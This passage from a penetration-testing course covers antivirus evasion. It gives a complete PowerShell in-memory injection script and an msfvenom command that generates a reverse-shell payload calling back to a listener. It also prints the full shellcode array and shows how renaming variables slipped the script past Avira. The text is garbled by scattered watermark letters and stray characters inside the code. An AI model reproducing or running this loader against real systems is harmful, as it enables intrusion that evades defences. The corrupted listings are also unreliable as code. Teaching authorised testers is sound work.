should build a dedicated VM that resembles the customer environment as closely as possible.
Regardless of the tested AV product, we should always make sure to disable sample submission
so that we don’t incur the same drawback as VirusTotal. For instance, Windows Defender’s
y
Automatic Sample Submission can be disabled by navigating to Windows Security > Virus & threat
protection > Manage Settings and deselecting the relative option as illustrated in the image below.
k
s
o
n
i
z
D
577 (antiscan.me, 2022), https://antiscan.me
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 360
Made in Morocco
Penetration Testing with Kali Linux
Figure 195: Disabling Windows Defender Automated Sample Submission
Having such a simulated target scenario allows us to freely test AV evasion vectors without
worrying about our sample being submitted for further analysis.
Since automatic sample submission allows Windows Defender to get our sample analyzed by its
machine learning cloud engines, we should only enable it once we are confident our bypasses will
be effective and only if our target has sample submission enabled.
Since both Windows Defender cloud protection and automatic sample
submission require internet connectivity, we should first verify that this is
reflected in our target environment: some company policies mandate limited
internet access to some production servers and as a consequence, some
advanced AV features are inhibited. y
k
Another rule of thumb we should follow when developing AV bypasses is to always prefer custom
code. As we have learned at the beginning of this Module, AV signatures are extrapolated from
s
the malware sample and thus, the more novel and diversified our code is, the fewer chances we
have to incur any existing detection.
o
12.3.2 Evading AV with Thread Injection
n
Now that we have a general understanding of the detection techniques used in antivirus software
and the relative bypass methods, we can turn our focus to a practical example.
i
Finding a universal solution to bypass all antivirus products is difficult and time consuming, if not
z
impossible. Considering time limitations during a typical penetration test, it is far more efficient to
target the specific antivirus product deployed in the target network.
D
For the purposes of this Module, we will interact with Avira Free Security version 1.1.68.29553 on
our Windows 11 client. Once we connect via RDP with the provided credentials, we’ll notice that
Avira is already installed and can be launched from the Desktop shortcut. Once started, we can
navigate to the Security panel from the left menu and click on Protection Options:
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 361
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
Figure 196: Searching for Protections Options in the Avira Menu
Launching this menu section will display thne currently running protections where we can verify if
the Real-Time Protection feature is enabled and manually enable it if needed.
i
z
D
Figure 197: Avira Control Center.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 362
Made in Morocco
Penetration Testing with Kali Linux
As a first step when testing AV products, we should verify that the antivirus is working as
intended. We will use the Metasploit payload we generated earlier and scan it with Avira.
After transferring the malicious PE to our Windows client, we are almost immediately warned
about the malicious content of the uploaded file. In this case, we are presented with an error
message indicating that our file has been blocked.
y
k
s
o
n
i
z
D
Figure 198: Avira Free Antivirus Quarantine Message
Avira displays a popup notification informing us that the file was flagged as malicious and
quarantined.
Antivirus products typically enforce threat quarantine by blocking any file system
operation at the kernel level or even storing the malicious samples in encrypted
storage accessible only by the AV software.
Depending on how restricted our target environment is, we might be able to bypass antivirus
products with the help of PowerShell.578
578 (Microsoft, 2017), https://docs.microsoft.com/en-us/powershell/scripting/getting-started/getting-started-with-windows-
powershell?view=powershell-6
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 363
Made in Morocco
Penetration Testing with Kali Linux
In the following example, we will use a remote process memory injection technique, similar to
what we learned in the previous Learning Unit. The main difference lies in the fact that we will
target the currently executing process, which in our case will be the x86 PowerShell interpreter.
A very powerful feature of PowerShell is its ability to interact with the Windows API.579 This allows
us to implement the in-memory injection process in a PowerShell script. One of the main benefits
of executing a script rather than a PE is that it is difficult for antivirus manufacturers to determine
if the script is malicious as it’s run inside an interpreter and the script itself isn’t executable code.
Nevertheless, please keep in mind that some AV products handle malicious script detection with
more success than others.580
Furthermore, even if the script is marked as malicious, it can easily be altered. Antivirus software
will often review variable names, comments, and logic, all of which can be changed without the
need to recompile anything.
y
To demonstrate an introductory AV bypass, we we are going to first analyze a well-known version
of the memory injection PowerShell script and then test it against Avira.
k
A basic templated script that performs in-memory injection is shown in the listing below.
s
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPotr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] n
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
i
[DllImport("msvcrt.dll")] z
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
D
$winFunc =
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc = ;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
Listing 238 - In-memory payload injection script for PowerShell
579 (Matt Graeber, 2013), https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-
windows-api-part-1/
580 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 364
Made in Morocco
Penetration Testing with Kali Linux
The script starts by importing VirtualAlloc581 and CreateThread582 from kernel32.dll as well as
memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution
thread, and write arbitrary data to the allocated memory, respectively. Once again, notice that we
are allocating the memory and executing a new thread in the current process (powershell.exe),
rather than a remote one.
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
y
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
Listing 239 - Importing Windows APIs in PowerShell
k
The script main logic starts by allocating a block of memory using VirtualAlloc, which takes each
byte of the payload stored in the $sc byte array and writes it to our newly-allocated memory block
s
using memset.
[Byte[]]$sc = ; o
$size = 0x1000;
n
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$siize,0x3000,0x40);
z
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};
Listing 240 - MemDory allocation and payload writing using Windows APIs in PowerShell
As a final step, our in-memory written payload is executed in a separate thread using the
CreateThread API.
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
Listing 241 - Calling the payload using CreateThread
Our chosen payload is missing from our script, but can be generated using msfvenom. We are
going to keep the payload identical to the one used in previous tests for consistency.
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f
powershell -v sc
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 699 bytes
Final size of powershell file: 3454 bytes
581 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
582 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 365
Made in Morocco
Penetration Testing with Kali Linux
[Byte[]] $sc =
0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,
0x8b,0x52,0x14,0x8b,0x72,0x28
...
Listing 242 - Generating a PowerShell compatible payload using msfvenom
The resulting output can be copied to the final script after copying the content of the $sc variable
into the script.
Our complete script resembles the following:
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);
y
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreatikonFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
s
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc = Add-Type -memberDefinition $code -oName "Win32" -namespace Win32Functions -
passthru;
[Byte[]]; n
[Byte[]] $sc =
0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,
0x8b,0x52,0x14,0x8b,0x72,0x28,0xif,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2
c,0x20,0xc1,0xcf,0xd,0x1,0xc7,z0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0
x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a
,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf
D
6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x
4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0
x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0
,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0
,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0
x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,
0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85
,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x
6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7
,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x4
6,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56
,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0
x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,
0x6f,0x6a,0x0,0x53,0xff,0xd5;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 366
Made in Morocco
Penetration Testing with Kali Linux
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
Listing 243 - First attempt for in-memory injection script
Next, we are going to verify the detection rate of our PowerShell script. Our preferred choice
would be Antiscan.Me, but sadly, it does not support ps1 format, so we have to resort to
VirusTotal.
y
k
s
o
n
i
z
D
Figure 199: VirusTotal results for in-memory injection in PowerShell
According to the results of the VirusTotal scan, 28 of the 59 AV products flagged our script as
malicious, including Avira. This is not as promising as expected, so we need to somewhat
circumvent the AV signature logic.
As mentioned, scripts are just interpreted text files. They are not easily fingerprinted like binary
files, which have a more structured data format.
In order to catch malicious scripts, AV vendors often rely on static string signatures related to
meaningful code portions, such as variables or function names.
To bypass this detection logic, let’s give the variables of the previous script more generic names.
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -
passthru;
[Byte[]];
[Byte[]] $var1 =
0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,
0x8b,0x52,0x14,0x8b,0x72,0x28
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 367
Made in Morocco
Penetration Testing with Kali Linux
...
$size = 0x1000;
if ($var1.Length -gt 0x1000) {$size = $var1.Length};
$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i),
$var1[$i], 1)};
$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
Listing 244 - Renaming variables for In-memory Injection
We have updated our script by changing the Win32 hard-coded class name for the Add-Type
cmdlet to iWin32. Similarly, we have renamed sc and winFunc to var1y and var2, respectively.
Once we save the PowerShell script as bypass.ps1 and transfer it over the target Windows 11
client, we can run a Quick Scan to verify that our attack vectkor is undetected. To run the scan,
we’ll click on the Security option on the left hand menu, select Virus Scans, and then click on Scan
under the Quick Scan option. s
o
To get sense of the detection rate, we could have uploaded the modified bypass
to VirusTotal as well. However, as we learned earlier, this could jeopardize our
n
penetration test as our sample could be analyzed and detected by the more
powerful cloud-based machine learning engines.
i
z
Once Avira has scanned our script on our Windows 11 machine, it indicates our script is not
malicious.
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 368
Made in Morocco
Penetration Testing with Kali Linux
y